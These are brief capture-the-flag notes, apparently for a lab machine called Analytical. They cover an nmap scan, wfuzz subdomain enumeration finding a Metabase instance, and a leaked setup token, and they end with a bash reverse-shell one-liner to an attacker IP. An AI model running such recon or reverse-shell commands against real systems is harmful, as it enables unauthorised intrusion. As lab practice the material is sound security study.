# 10.10.11.233

## NMAP
```bash
PORT   STATE SERVICE VERSION  
80/tcp open  http    nginx 1.18.0 (Ubuntu)  
|_http-title: Did not follow redirect to http://analytical.htb/  
|_http-server-header: nginx/1.18.0 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## WFuzz (subdomains)
```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://ana  
lytical.htb/ -H 'Host: FUZZ.analytical.htb' -t 50 --hc 301,302  
/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openss  
l. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more informat  
ion.  
********************************************************  
* Wfuzz 3.1.0 - The Web Fuzzer                         *  
********************************************************  
  
Target: http://analytical.htb/  
Total requests: 19966  
  
=====================================================================  
ID           Response   Lines    Word       Chars       Payload                                  
=====================================================================  
  
000000149:   200        27 L     3538 W     77677 Ch    "data"
```

## Metabase Setup token
http://data.analytical.htb/api/session/properties
```json
{
	// ...
	"setup-token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
	// ...
}
```

bash -i >&/dev/tcp/10.10.14.21/9998 0>&1